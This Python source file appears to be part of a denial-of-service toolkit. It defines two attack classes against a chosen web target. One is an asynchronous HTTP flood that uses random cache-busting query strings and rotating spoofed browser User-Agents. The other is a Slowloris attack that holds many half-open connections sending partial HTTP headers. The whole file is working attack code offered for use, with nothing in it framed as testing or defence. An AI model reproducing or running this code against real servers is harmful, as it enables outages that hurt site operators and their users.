import random
import socket
import string
import time
from _lib.ring1.base import Vector

try:
    import aiohttp
    _AIO = True
except ImportError:
    _AIO = False

UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/123.0 Safari/537.36",
]


def _r(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _base(d):
    t = d["target"]
    if t.get("url"):
        return t["url"].rstrip("/")
    host = d.get("ipv4") or d.get("ipv6") or t.get("host")
    port = t.get("port")
    if port and port not in (80, 443):
        return f"http://{host}:{port}"
    return f"http://{host}"


class CacheBustFlood(Vector):
    name = "http-cachebust"; needs = ["http"]
    def run(self, d, args):
        if not _AIO:
            return
        base = _base(d)

        async def worker():
            to = aiohttp.ClientTimeout(total=10)
            conn = aiohttp.TCPConnector(ssl=False, limit=0)
            async with aiohttp.ClientSession(timeout=to, connector=conn) as s:
                end = time.time() + args.duration
                while time.time() < end:
                    url = f"{base}/?_={_r()}"
                    h = {"User-Agent": random.choice(UA),
                         "Cache-Control": "no-cache"}
                    try:
                        async with s.get(url, headers=h, ssl=False) as r:
                            await r.read()
                    except Exception:
                        pass
        import asyncio
        asyncio.run(asyncio.gather(*[worker() for _ in range(max(1, args.rate // 10))]))


class Slowloris(Vector):
    name = "http-slowloris"; needs = ["http"]
    def run(self, d, args):
        host = d.get("ipv4") or d.get("ipv6")
        port = d["target"].get("port") or 80
        socks = []
        end = time.time() + args.duration
        while time.time() < end:
            try:
                s = socket.create_connection((host, port), timeout=3)
                s.sendall(f"GET /?{_r()} HTTP/1.1\r\n".encode())
                s.sendall(f"Host: {host}\r\n".encode())
                s.sendall(b"User-Agent: " + random.choice(UA).encode() + b"\r\n")
                socks.append(s)
            except Exception:
                pass
            time.sleep(1.0 / max(1, args.rate))
        print(f"  slowloris: {len(socks)} half-open")
